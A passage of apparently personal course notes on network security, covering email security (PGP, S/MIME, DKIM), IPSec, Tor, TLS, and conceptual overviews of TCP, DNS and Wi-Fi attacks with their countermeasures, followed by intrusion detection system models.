<li>What is DKIM? How is the DKIM email authentication service different when compared to S/MIME or PGP?<ul>
<li>The sender’s email server signs emails</li>
<li>DKIM is for email server to email server, PGP and S/MIME are end to end encryption.</li>
</ul>
</li>
</ul>
<h3 id="Simple-Mail-Transfer-Protocol-SMTP"><a href="#Simple-Mail-Transfer-Protocol-SMTP" class="headerlink" title="Simple Mail Transfer Protocol (SMTP)"></a>Simple Mail Transfer Protocol (SMTP)</h3><ul>
<li>text only</li>
<li>limited to ASCII</li>
<li>Size limit</li>
<li>command only</li>
<li>issues<ul>
<li>no security - clear/plain messages</li>
</ul>
</li>
</ul>
<h3 id="Email-Threats"><a href="#Email-Threats" class="headerlink" title="Email Threats"></a>Email Threats</h3><ul>
<li>Authenticity<ul>
<li>unauthorised access</li>
</ul>
</li>
<li>Integrity<ul>
<li>unauthorised modification of emails</li>
</ul>
</li>
<li>Confidentiality<ul>
<li>unauthorised disclosure of sensitive information</li>
</ul>
</li>
<li>Availability<ul>
<li>prevent users from sending/receiving emails</li>
</ul>
</li>
</ul>
<p>TLS is not enough secure for emails, because it only secures communication between two hops. ALL intermediate hops see plaintext.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104131545588.png"></p>
<h3 id="Pretty-Good-Privacy-PGP"><a href="#Pretty-Good-Privacy-PGP" class="headerlink" title="Pretty Good Privacy (PGP)"></a>Pretty Good Privacy (PGP)</h3><ul>
<li><p>key management</p>
</li>
<li><p>AUTH + INT</p>
<ul>
<li>Digital signature(Non-repudiation)</li>
</ul>
</li>
<li><p>CONF</p>
<ul>
<li>Encryption</li>
</ul>
</li>
<li><p><strong>Encryption steps</strong></p>
<ul>
<li>HASH(M) =&gt; <strong>digest</strong></li>
<li>RSA(digest,secretKey) =&gt; <strong>digital signature</strong><ul>
<li>RSA is a public-key encryption especially used for signing.</li>
</ul>
</li>
<li>Digital signature || M =&gt; certificate</li>
<li>Compress(certificate) =&gt; compressed certificate</li>
<li>AES(sessionKey, compressed certificate) =&gt; encrypted compressed certificate(using symmetric encryption)</li>
<li>RSA(sessionKey, ReceiverPublicKey) =&gt; encrypted sessionKey, used to transmit session key, another user can use his private key to get the session key.</li>
<li>Send to the recipient:  encrypted compressed certificate || encrypted sessionKey</li>
</ul>
</li>
<li><p><strong>Decryption steps</strong></p>
<ul>
<li>Get decrypted session key using the private key =&gt; sessionKey</li>
<li>Get decrypted compressed certificate using the seesionKey =&gt; compressed cetrificate</li>
<li>Get M||digital signature by decompressing the data =&gt; <code>M||digital signature = DeCompress(compressed certificate)</code></li>
<li>Verify hash(M) and hash(M’)<ul>
<li>Hash(M’) = decrypt the digital signature using the sender’s public key.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Compression</strong></p>
<ul>
<li><p>PGP uses a ZIP compression algorithm, <strong>after</strong> applying the signature and <strong>before</strong> the encryption</p>
</li>
<li><p>Why does this order matter?</p>
<ul>
<li>It is preferable to sign an uncompressed message so that the signature does not depend on the compression algorithm. If you do the compression first, the signatures will be different when different compression algorithms are applied.</li>
<li>This has the benefit of saving space both for e-mail transmission and for file storage.</li>
<li><strong>Encryption after compression</strong> strengthens the encryption, since compression reduces redundancy in the message.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Radix-64 conversion</strong></p>
<ul>
<li>used for achieving compatibility with email protocols</li>
<li>text=&gt;Binary =&gt; ASCII character, every 6bits = 1 ASCII character</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151025128.png"></li>
</ul>
</li>
<li><p><strong>Key Management</strong></p>
<ul>
<li>send key identifier(KeyID) instead of full pk for bandwidth efficiency</li>
<li>users can have multiple key pairs</li>
<li>two types of key rings to maintain<ul>
<li>her own public/private key pairs<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151909960.png"></li>
<li>Store encrypted private keys instead of clear private keys</li>
</ul>
</li>
<li>public keys of other correspondents<ul>
<li>all pk of other users known to the user, indexed by their key Ids.</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104151758274.png"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>Trust Model</p>
<ul>
<li>not rely on certificate authorities (CAs)</li>
<li>every user is its own CA<ul>
<li>Sign keys for users they know</li>
</ul>
</li>
<li>forms web of trust<ul>
<li>trusted keys signed</li>
<li>trusted keys other have signed if there is a chain of signatures to them</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Limitations</strong></p>
<ul>
<li>Must exchange public key</li>
<li>Target attacks against PGP keyIDs</li>
<li>prevent useful functionality like search, spam filtering, topic extraction..</li>
</ul>
</li>
</ul>
<h3 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h3><p>MIME(Secure/MultipurposeInternet Mail Extensions) supports different types of content.</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221104153525217.png"></p>
<p>Each client has a list of trusted CA’s certs and their own pairs &amp; certs signed by trusted CA’s</p>
<h3 id="Domain-Keys-Identified-Mail-DKIM"><a href="#Domain-Keys-Identified-Mail-DKIM" class="headerlink" title="Domain Keys Identified Mail(DKIM)"></a>Domain Keys Identified Mail(DKIM)</h3><p>Tx(user)’s email must be signed by a secret key of the admin domain of Tx before leaving the domain.</p>
<p>Transparent to user.</p>
<p>Rx can verify the signature using the domain’s public key.</p>
<p>the public key will be stored in the DNS server, the signature will be attached to the header of the email.</p>
<h2 id="Week-4-IPSec"><a href="#Week-4-IPSec" class="headerlink" title="Week 4: IPSec"></a>Week 4: IPSec</h2><h3 id="Concepts"><a href="#Concepts" class="headerlink" title="Concepts"></a>Concepts</h3><p>IPSec =&gt; network layer</p>
<p>IPSec <strong>secures IP datagrams at the Internet layer according to the security policy</strong> of a communicating IP node, before forwarding them to the network interface layer.</p>
<p>The intended receiving IP node verifies the datagrams according to the <strong>established security paramaeters</strong> and <strong>rejects</strong> any that have not been protected in accordance with the policy defined for such traffic.</p>
<h3 id="IPSec-Services"><a href="#IPSec-Services" class="headerlink" title="IPSec Services"></a>IPSec Services</h3><blockquote>
<p><strong>Authentication</strong></p>
<ul>
<li>data origin authentication - verifies the claimed identify of the source data</li>
</ul>
<p><strong>Integrity</strong></p>
<ul>
<li>connectionless integrity<ul>
<li>detects tampering of individual ip datagrams</li>
</ul>
</li>
<li>Anti-replay integrity<ul>
<li>detects arrival of duplicate IP datagrams</li>
</ul>
</li>
</ul>
<p><strong>Confidentiality:</strong></p>
<ul>
<li>Protects data from unauthroised disclosure and provides a limited form of traffic-flow confidentiality.<ul>
<li>conceals(hides) the source IP address, the destination IP address, the size of an IP datagram and frequency of communication</li>
</ul>
</li>
</ul>
</blockquote>
<ul>
<li>Authentication Header(AH)<ul>
<li>INT, data-origin AUTH, anti-replay(Sequence number), access control, no CONF</li>
<li>can only <strong>authenticate</strong> data(IP payload and selected portion of IP header), and <strong>cannot encrypt</strong> data.</li>
</ul>
</li>
<li>Encapsulating Security Payload(ESP)<ul>
<li>anti-replay, CONF</li>
<li>encrypts and authenticates IP payload but not IP header</li>
</ul>
</li>
</ul>
<h3 id="IPSec-Modes"><a href="#IPSec-Modes" class="headerlink" title="IPSec Modes"></a>IPSec Modes</h3><ul>
<li>Transport Mode<ul>
<li>IP packet inserted with IPsec header</li>
</ul>
</li>
<li>Tunnel Mode<ul>
<li>original packet preserved, new header added/prepended.</li>
<li>ESP/AH Header is immediately after the New IP Header, original IP packet preserved</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>Transport Mode</th>
<th>Tunnel Mode</th>
</tr>
</thead>
<tbody><tr>
<td>AH</td>
<td>Authenticates IP payload and selected portions of IP header</td>
<td>Authenticates entire inner IP packet (inner header plus IP payload) plus a selected portion of the outer IP header.</td>
</tr>
<tr>
<td>ESP</td>
<td>Encrypts IP payload. Allows traffic analysis</td>
<td>Encrypts entire inner IP packet. No routers on the way can examine the inner IP header.</td>
</tr>
<tr>
<td>ESP+AUTH</td>
<td>Encrypts IP payload. Authenticates IP payload but not IP header</td>
<td>Encrypts entire inner IP packet. Authenticates inner IP packet.</td>
</tr>
</tbody></table>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221105101117217.png"></p>
<h3 id="Anti-replay-Services"><a href="#Anti-replay-Services" class="headerlink" title="Anti-replay Services"></a>Anti-replay Services</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221105105559855.png"></p>
<p>Cases</p>
<ul>
<li>If sequence number received now is smaller than the most left size of the current window, drop the packet.</li>
<li>If sequence number received now is within the current window range, check if packet has already been recived</li>
<li>If sequence number received now is greater than the max size of the current window, make the sequence number received now the max edge, and calculate the min edge through <code>N-W+1</code></li>
<li>If the recipient sets N=60 and the window size W=64, range should be 0-60</li>
</ul>
<h3 id="Security-Policy-Database-SPD"><a href="#Security-Policy-Database-SPD" class="headerlink" title="Security Policy Database(SPD)"></a>Security Policy Database(SPD)</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106101507795.png"></p>
<p><strong>3 IPSec policies:</strong></p>
<ul>
<li>DISCARD<ul>
<li>discard the packet</li>
</ul>
</li>
<li>PROTECT<ul>
<li>protect the packet with AH and the ESP security protocols</li>
</ul>
</li>
<li>BYPASS<ul>
<li>bypass the IPSec processing</li>
</ul>
</li>
</ul>
<h3 id="Security-Association-Database-SAD"><a href="#Security-Association-Database-SAD" class="headerlink" title="Security Association Database(SAD)"></a>Security Association Database(SAD)</h3><ul>
<li><p>AH info</p>
</li>
<li><p>ESP info</p>
</li>
<li><p>Lifetime of this SA</p>
</li>
<li><p>IPsec Protocol Mode</p>
<ul>
<li>Transparent/tunnel</li>
</ul>
</li>
</ul>
<h3 id="IPSec-Architecture"><a href="#IPSec-Architecture" class="headerlink" title="IPSec Architecture"></a>IPSec Architecture</h3><ul>
<li>Authentication Header(AH)<ul>
<li>An extension header for message authentication</li>
</ul>
</li>
<li>Encapsulating Security Payload(ESP)<ul>
<li>provides encryption for combined encryption/msg INT</li>
</ul>
</li>
<li>Internet Key Exchange(IKE)<ul>
<li>the key management schemes for use with IPSec</li>
</ul>
</li>
</ul>
<h3 id="Virtual-Private-Networks-VPN"><a href="#Virtual-Private-Networks-VPN" class="headerlink" title="Virtual Private Networks(VPN)"></a>Virtual Private Networks(VPN)</h3><p>Isolation</p>
<p>Tunneling</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106103411619.png"></p>
<p>Many logical overlay networks co-exist</p>
<ul>
<li>over the same physical network</li>
<li>provide its own dedicated service</li>
</ul>
<h4 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h4><ul>
<li>Which one is better?<ul>
<li>Placing VPN server behind the firewall</li>
<li>Placing VPN server in front of the firewall</li>
<li>Anwser<ul>
<li>VPN in front of the firewall is better. VPN has the function of firewall as well, after the VPN gateway, the message will be decrypted so that Firewall can look into the details of the package.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><h4 id="Components-for-Tor"><a href="#Components-for-Tor" class="headerlink" title="Components for Tor"></a>Components for Tor</h4><ul>
<li>Client</li>
<li>Server</li>
<li>Tor(onion) router: the special proxy relays the application adata</li>
<li>Directory server: servs holding Tor router information</li>
</ul>
<h4 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h4><p>The last router will see the clear data but not be knowing where the message from.</p>
<p>Every router only knows the predecessor and successor.</p>
<p><strong>Send Message from client:</strong></p>
<ol>
<li><p>Client obtains a list of Tor nodes from a <strong>directory server</strong></p>
</li>
<li><p>Client picks a random path to destination server.</p>
</li>
<li><p>Client negotiates an AES key with <strong>each router</strong>(every router has its own encryption key).</p>
</li>
<li><p>Client encrypts message</p>
<ul>
<li>C3 = Encrypt(K3, data||IP_Server)</li>
<li>C2 = Encrypt(K2, C3 || IP_OR3)</li>
<li>C1 = Encrypt(K1, C2 || IP_OR2)</li>
</ul>
</li>
<li><p>Client sends an IP packet as: IP_Client || IP_OR1 || C1</p>
<ul>
<li>send IP packet that is consist of current router/machine’s IP, next destination’s IP and encryped message</li>
</ul>
</li>
</ol>
<ul>
<li><p>Packet arrives at OR1 and OR1 performs:</p>
<ul>
<li>C2 || IP_OR2 = DEC(K1, C1)</li>
<li>caches IP_Client, IP_OR2</li>
<li>sents an IP packet as: IP_OR1 || IP_OR2 || C2</li>
</ul>
</li>
<li><p>Packet arrives at OR2 and OR2 performs:</p>
<ul>
<li>C3 || IP_OR3 = DEC(K2, C2)</li>
<li>caches IP_OR1 || IP_OR3</li>
<li>sents an IP packet as IP_OR2 || IP_OR3 || C3</li>
</ul>
</li>
<li><p>Packet arrvies at OR3 and OR3 performs:</p>
<ul>
<li>IP_Server || data = DEC(K3,C3)</li>
<li>Caches IP_OR2, IP_Server</li>
<li>sents an IP packet as IP_OR3 || IP_SERVER || data</li>
</ul>
</li>
</ul>
<h2 id="Week-5-Transport-Layer-Security-TLS"><a href="#Week-5-Transport-Layer-Security-TLS" class="headerlink" title="Week 5: Transport Layer Security (TLS)"></a>Week 5: Transport Layer Security (TLS)</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>TLS sits <strong>between</strong> the Transport layer and Application layer(not belong to any of them).</p>
<ul>
<li>Unsurported data =&gt; given to TLS by <strong>application layer</strong></li>
<li>TLS gives protected data to <strong>transport layer</strong>.</li>
</ul>
<p>Confidentiality</p>
<ul>
<li>Nobody other than the two ends of the channel can see the actual content of the data transmitted.</li>
</ul>
<p>Integrity</p>
<ul>
<li>Channel can detect any changes</li>
</ul>
<p>Authentication</p>
<ul>
<li>At least one end of the channel needs to be authenticated, so the other end knows who it is talking to.</li>
</ul>
<h3 id="Stages"><a href="#Stages" class="headerlink" title="Stages"></a>Stages</h3><ul>
<li><p>Setup: TLS handshake</p>
<ul>
<li><a href="https://leihehe.top/2022/06/12/Security-Protocols/">https://leihehe.top/2022/06/12/Security-Protocols/</a></li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106220121668.png"></li>
</ul>
</li>
<li><p>Secure Chanel: TLS Record</p>
<ul>
<li><p>Each record contains a header and a payload.</p>
<ul>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221106221639327.png"></li>
<li>Break stream in series of records<ul>
<li>each record carries a MAC</li>
<li>receiver can act on each record as it arrives</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Send data process</strong></p>
<ul>
<li>Get data from application layer</li>
<li>Fragement</li>
<li>Compress(optional)</li>
<li>Add MAC and padding</li>
<li>Encrypt</li>
<li>Add TLS header</li>
</ul>
</li>
<li><p><strong>Receive data process</strong></p>
<ul>
<li>Decrypt</li>
<li>Check integrity<ul>
<li>use variable-length records to distinguish MAC from data</li>
<li><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221107102250059.png"></li>
</ul>
</li>
<li>Decompress</li>
<li>Buffered</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Trunction-Attack"><a href="#Trunction-Attack" class="headerlink" title="Trunction Attack"></a>Trunction Attack</h3><p>Attacker forges TCP connection close segment</p>
<p>one or both sides think there is less data than there actually is</p>
<p><strong>Solution</strong>: record types, with one type for closure</p>
<ul>
<li>Type 0 for data, Type closure</li>
</ul>
<h3 id="POODLE-Attack"><a href="#POODLE-Attack" class="headerlink" title="POODLE Attack"></a>POODLE Attack</h3><p>it takes advantage of CBC mode (SSL V3.0).</p>
<ul>
<li>The client initiates handshake and sends client_hello</li>
<li>The attacker intercepts via MITM attack, and impersonates the server until the client agrees to downgrade to v3.0</li>
</ul>
<h3 id="Attack-Scenario"><a href="#Attack-Scenario" class="headerlink" title="Attack Scenario"></a>Attack Scenario</h3><p>Attacker intercepts the channel between client and web server and injects ciphertexts</p>
<p>Server responses that an attacker can explore:</p>
<ul>
<li>Case 1: Valid ciphertext and padding</li>
<li>Case 2: Invalid ciphertext with invalid padding</li>
<li>Case 3: Invalid ciphertext but valid padding</li>
</ul>
<h3 id="Countermeasures"><a href="#Countermeasures" class="headerlink" title="Countermeasures"></a>Countermeasures</h3><ul>
<li><p>Remove server response</p>
</li>
<li><p>Use AES GCM model - authenticated encryption</p>
<ul>
<li>Ensure that the ciphertext is not modified during the transmission</li>
</ul>
</li>
</ul>
<h2 id="Week-6-Network-Attacks"><a href="#Week-6-Network-Attacks" class="headerlink" title="Week 6: Network Attacks"></a>Week 6: Network Attacks</h2><h3 id="Review-Questions"><a href="#Review-Questions" class="headerlink" title="Review Questions"></a>Review Questions</h3><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221114100445315.png"></p>
<p>Network Level</p>
<ul>
<li>VPN, IPSEC</li>
<li>good when you want to encrypt everything(traffic)</li>
</ul>
<p>Transport Level</p>
<ul>
<li>TLS<ul>
<li>services provided<ul>
<li>Confidentiality<ul>
<li>Encryption</li>
</ul>
</li>
<li>Integrity<ul>
<li>MAC</li>
</ul>
</li>
<li>Authentication</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>Application Level</p>
<h3 id="SYN-Flooding-Attack"><a href="#SYN-Flooding-Attack" class="headerlink" title="SYN Flooding Attack"></a>SYN Flooding Attack</h3><h4 id="TCP-3-way-Handshake"><a href="#TCP-3-way-Handshake" class="headerlink" title="TCP 3-way Handshake"></a>TCP 3-way Handshake</h4><p>According to TCP 3-way handshake Protocol, when the server recievs the initial SYN pakcet, it uses TCB(Transmisson Control Block) to store the information about the connection</p>
<ul>
<li>This is called half-open connection as only client-server connection is comfirmed.</li>
<li>The server stores the TCB in a queue that is only for the half-open connection.</li>
</ul>
<p>After the server gets ACK packet, it will take this TCB out of queue and store in a different place.</p>
<h4 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h4><p>Continuously send a lot of SYN packets to the server using spoofed ip addresses. This consumes the space in the queue by inserting the TCB record.</p>
<p>Do not finish the 3rd stop of hanshake as it dequeue the TCB record</p>
<h4 id="Contermeasure-SYN-Cookies"><a href="#Contermeasure-SYN-Cookies" class="headerlink" title="Contermeasure: SYN Cookies"></a>Contermeasure: SYN Cookies</h4><ul>
<li>After receiving a SYN packet, the server will calculate a keyed hash in terms of the SYN packet using a <strong>secret key</strong>.</li>
<li>This hash(H) is sent to the client(ip address) as the initial sequence number from the server. H is called SYN cookie.</li>
<li><strong>The server will not store the half-open connection in its queue.</strong></li>
<li><strong>Attacker will not recived H because of the fake IP address.</strong></li>
<li>Normal client will send H+1 to the server, and server will check it.</li>
</ul>
<h4 id="Week-Countermeasure"><a href="#Week-Countermeasure" class="headerlink" title="Week Countermeasure"></a>Week Countermeasure</h4><ul>
<li>Do not store any information about SYN packet.<ul>
<li>ACK flood attack, no corresponding ack number and seq number stored in the buffer.</li>
</ul>
</li>
</ul>
<h3 id="TCP-Reset-Attack"><a href="#TCP-Reset-Attack" class="headerlink" title="TCP Reset Attack"></a>TCP Reset Attack</h3><ul>
<li><p>stop the connection between two hosts.</p>
</li>
<li><p>use RST(header) packet to immediately break the conneciton.</p>
<ul>
<li>get corresponding information from the last packet(sequence number, source port, etc)</li>
</ul>
</li>
<li><p><strong>Can TLS mitigate this attack?</strong></p>
<ul>
<li><p>NO. TLS is on top of TCP, TLS cannot protect the header of TCP, so RST can still be set.</p>
</li>
<li><p><strong>Solution:</strong></p>
<ul>
<li>IDS</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="TCP-Session-Hijacking-Attack"><a href="#TCP-Session-Hijacking-Attack" class="headerlink" title="TCP Session Hijacking Attack"></a>TCP Session Hijacking Attack</h3><ul>
<li><p>What can a hacker do?</p>
<ul>
<li><p>Capture the packet and get the <code>next sequence number</code> and <code>acknowledgement number</code></p>
</li>
<li><p>Forge a packet using the information got previously.</p>
<ul>
<li>Trying to make the packet valid</li>
</ul>
</li>
<li><p>Successfully take over the session</p>
</li>
</ul>
</li>
<li><p><strong>Solution</strong></p>
<ul>
<li>making it difficult for attackers to spoof packets<ul>
<li>Randomise initial sequence number</li>
<li>Randomise source port number</li>
</ul>
</li>
<li>Encrypting TCP payload and header</li>
</ul>
</li>
</ul>
<h3 id="DNS-Protocols"><a href="#DNS-Protocols" class="headerlink" title="DNS Protocols"></a>DNS Protocols</h3><h4 id="Authoritative-Name-Servers"><a href="#Authoritative-Name-Servers" class="headerlink" title="Authoritative Name Servers"></a>Authoritative Name Servers</h4><ul>
<li>Each DNS zone has at least one authoritative nameserver that publishes information about the zone.</li>
<li>It provides the original and definitive answers to DNS queries.</li>
</ul>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221107162059195.png"></p>
<h4 id="Local-DNS-cache-poisoning-attack"><a href="#Local-DNS-cache-poisoning-attack" class="headerlink" title="Local DNS cache poisoning attack"></a>Local DNS cache poisoning attack</h4><ul>
<li>Attack on user machines<ul>
<li>attacker sends a fake DNS response with an evil IP address to the user machine which sent out a DNS query.</li>
</ul>
</li>
<li>Attack on local DNS server(Cache Poisoning attack)<ul>
<li>When the local DNS server sends out iterative queries to get an answer from the DNS servers on the internet, attackers can send out spoofed replies to the local DNS server.</li>
<li>They get accepted as long as they arrive before the actual replies.</li>
</ul>
</li>
</ul>
<h4 id="Remote-DNS-cache-poisoning-attack"><a href="#Remote-DNS-cache-poisoning-attack" class="headerlink" title="Remote DNS cache poisoning attack"></a>Remote DNS cache poisoning attack</h4><p>Remote DNS cache poisoning attack needs to guess the port number, transaction ID, etc.</p>
<p><strong>Cache effect</strong>: if no attempt fails, the actual reply will be cached by the local DNS server; the attacker needs to wait for the cache to timeout for the next attempt.</p>
<p><strong>The Kaminsky Attack</strong>: ask a different question every time, and guess the transaction id and port number.</p>
<h5 id="Countermeasures-1"><a href="#Countermeasures-1" class="headerlink" title="Countermeasures"></a>Countermeasures</h5><ul>
<li><p><strong>DNSSEC</strong></p>
<ul>
<li>provide authentication and integrity checking on DNS data, not confidentiality.</li>
<li>No client/server setup “dialog”.</li>
<li>Check <strong>digital signatures</strong> -&gt; check if the information is authentic or not.</li>
<li>depend on trust in the Root Name Server’s key, and all other signing keys</li>
</ul>
</li>
<li><p><strong>TLS/SSL</strong></p>
<ul>
<li>Client &amp; server agree on crypto, session keys</li>
<li>depend on trust in Certificate Authorities/decision to sign keys</li>
</ul>
</li>
</ul>
<h2 id="Week-7-Wireless-Security"><a href="#Week-7-Wireless-Security" class="headerlink" title="Week 7: Wireless Security"></a>Week 7: Wireless Security</h2><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>Basic building block of an 802.11 WLAN:</p>
<ul>
<li>AP(BSS) and clients</li>
</ul>
<p>Define an Extended Service set</p>
<ul>
<li>Network of multiple BSS using Distribution System. e.g. eduroam</li>
</ul>
<p>Security areas addressed by IEEE 802.11i</p>
<ul>
<li>Authentication, Confidentiality and integrity.</li>
</ul>
<p>Difference between TKIP and CCMP</p>
<ul>
<li><p>TKIP(Temporal Key Integrity Protocol) was introduced to improve security of WEP</p>
</li>
<li><p>CCMP(Computer mode anad Cipher Block Chaining Protocol) is sued in WPA2, it provides authentication, integrity and confidentiality.</p>
</li>
</ul>
<h3 id="Threats"><a href="#Threats" class="headerlink" title="Threats"></a>Threats</h3><ul>
<li>Man-in-the-Middle attack</li>
<li>Identity theft, media accesss control(MAC) address spoofing</li>
<li>Ad hoc networks</li>
<li>Denial of Service(DoS)</li>
<li>Network injection</li>
</ul>
<h3 id="Wired-Equivalent-Privacy-WEP"><a href="#Wired-Equivalent-Privacy-WEP" class="headerlink" title="Wired Equivalent Privacy(WEP)"></a>Wired Equivalent Privacy(WEP)</h3><ul>
<li><p><strong>Improper IV management</strong></p>
<ul>
<li>Can detect when IV reused<ul>
<li>IV collision</li>
</ul>
</li>
</ul>
</li>
<li><p>WEP recommends</p>
<ul>
<li>IV changed per packet</li>
<li>some WEP implementations weak</li>
</ul>
</li>
<li><p>Messages can be modified without knowing the key</p>
</li>
<li><p>CRC32 not a MAC</p>
<ul>
<li>is linear</li>
</ul>
</li>
<li><p>CRC32 used with a stream cipher</p>
<ul>
<li>stream cipher is linear</li>
</ul>
</li>
<li><p>can modify ciphertext without disctributing m</p>
</li>
</ul>
<h3 id="WPA2"><a href="#WPA2" class="headerlink" title="WPA2"></a>WPA2</h3><h4 id="The-4-way-handshake"><a href="#The-4-way-handshake" class="headerlink" title="The 4-way handshake"></a>The 4-way handshake</h4><ul>
<li>used to connect to any protected Wi-Fi network<ul>
<li>provides mutual authentication</li>
<li>Negotiates fresh PTK: pairwise temporal key</li>
</ul>
</li>
</ul>
<h4 id="Reinstallation-Attack"><a href="#Reinstallation-Attack" class="headerlink" title="Reinstallation Attack"></a>Reinstallation Attack</h4><p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20221108132402663.png"></p>
<p>After the client receives <code>msg3</code>, the client will install the key. Once the key is installed, it will be used to encrypt data frames and send <code>msg4</code> to AP. If AP did not receive <code>msg4</code>, it will re-transmit the <code>msg3</code>, client will re-install the same encryption key and thereby reset the <strong>incremental transmit packet number (nonce)</strong> and receive the replay counter used by the encryption protocol.</p>
<blockquote>
<p>As a result, <strong>the same encryption key is used with nonce values that have already been used in the past</strong>. In turn, this causes all encryption protocols of WPA2 to reuse <a href="https://en.wikipedia.org/wiki/Keystream">keystream</a> when encrypting packets. In case a message that reuses keystream has known content, it becomes trivial to derive the used keystream. This keystream can then be used to decrypt messages with the same nonce. </p>
</blockquote>
<p><strong>Solution</strong></p>
<ul>
<li>Do not retransmit message 3/4</li>
</ul>
<h3 id="Jamming"><a href="#Jamming" class="headerlink" title="Jamming"></a>Jamming</h3><p>Transmitting a continuous jamming signal or several short jamming pulses causes DoS</p>
<p><strong>Detection</strong></p>
<ul>
<li><p>monitor signal strength</p>
</li>
<li><p>monitor carrier sensing time</p>
</li>
</ul>
<h2 id="Week-8-Intrusion-Detection-System-IDS"><a href="#Week-8-Intrusion-Detection-System-IDS" class="headerlink" title="Week 8: Intrusion Detection System(IDS)"></a>Week 8: Intrusion Detection System(IDS)</h2><h3 id="Intruders"><a href="#Intruders" class="headerlink" title="Intruders"></a>Intruders</h3><p>Masquerade</p>
<ul>
<li>outsider in general</li>
</ul>
<p>Misfeasor</p>
<ul>
<li>Insider in general</li>
</ul>
<p>Clandestine</p>
<ul>
<li>can be both</li>
</ul>
<h3 id="Design-Goals"><a href="#Design-Goals" class="headerlink" title="Design Goals"></a>Design Goals</h3><ul>
<li>Detect a wide variety of intrusions<ul>
<li>cover known and unknown attacks</li>
<li>Adapt to new attacks or changes in behaviour</li>
</ul>
</li>
<li>Detect intrusions in real-time<ul>
<li>analyse user activities efficiently</li>
<li>Report suspicious cases timely</li>
</ul>
</li>
<li>Ensure accuracy<ul>
<li>minimise false positives and false negatives</li>
</ul>
</li>
</ul>
<h3 id="IDS-Models"><a href="#IDS-Models" class="headerlink" title="IDS Models"></a>IDS Models</h3><ul>
<li>Signature-based<ul>
<li>unusual behaviours are known</li>
<li>pro<ul>
<li>effective and efficient at detecting known threats</li>
<li>less false positive</li>
<li>Raise alarm when activities match the signature</li>
</ul>
</li>
<li>con<ul>
<li>ineffective at detecting unknown threats and many variants of known threats</li>
<li>cannot track and understand the state of complex communication, so it cannot detect most attacks that consist of multiple events.</li>
<li>hard to keep signature updates</li>
</ul>
</li>
</ul>
</li>
<li>Anomaly-based<ul>
<li>Usual behaviours are known</li>
<li>Raise alarm when activities deviate from the usual behaviour</li>
<li>pro<ul>
<li>can detect the unknown attack</li>
<li>can use a new user profile to update</li>
</ul>
</li>
<li>con<ul>
<li>it requires more time and processing capacity than signature-based IDS(less efficient to identify the behaviours)</li>
<li>it may generate false positives(a normal activity is recognised as malicious) and false negative(a malicious activity is recognised as normal)</li>
</ul>
</li>
</ul>
</li>
<li>Heuristic-based<ul>
<li>Use a machine learning model for normal behaviour</li>
<li>Raise alarm when activities are identified as abnormal by the model</li>
<li>pro<ul>
<li>reveal the hidden pattern in complicated data</li>
<li>it is adaptive to the change in users’ behaviours</li>
</ul>
</li>
<li>con<ul>
<li>Lack of training data</li>
<li>a model can be poisoned by adversarial input</li>
<li>still have many false positives</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="IDS-Architecture"><a href="#IDS-Architecture" class="headerlink" title="IDS Architecture"></a>IDS Architecture</h3><ul>
<li><p>Auditor</p>
<ul>
<li>record all security-relevant activities for analysis</li>
</ul>
</li>
<li><p>Analyser</p>
<ul>
<li>Automatically analyse the data from the auditor</li>
<li>update auditor and analyser settings when needed</li>
</ul>
</li>
<li><p>Notifier</p>
<ul>
<li>Report detected anomaly</li>
<li>Update auditor and analyser settings when needed</li>
<li>Initiate countermeasures</li>
</ul>
</li>
</ul>
<h3 id="IDS-Types"><a href="#IDS-Types" class="headerlink" title="IDS Types"></a>IDS Types</h3><ul>
<li>Host-based IDS<ul>
<li>Deploy in local system to detect malicious activities on a single device.</li>
<li>It can be sued tas a distributed system in the network.</li>
<li>Pros<ul>
<li>low cost since most of the HIDS is software-based</li>
<li>can see low-level activities</li>
<li>low error rate for local threats</li>
</ul>
</li>
<li>Cons:<ul>
<li>limited view on the network</li>
<li>malicious insider can tamper the system</li>
</ul>
</li>
</ul>
</li>
<li>Network-based IDS(NIDS)<ul>
<li>Monitor the traffic on the entire network to detect instrusions</li>
<li>Pros:<ul>
<li>can see attacks in network traffic especially in Transport layer or IP layer.</li>
<li>Hard to temper</li>
</ul>
</li>
<li>Cons<ul>
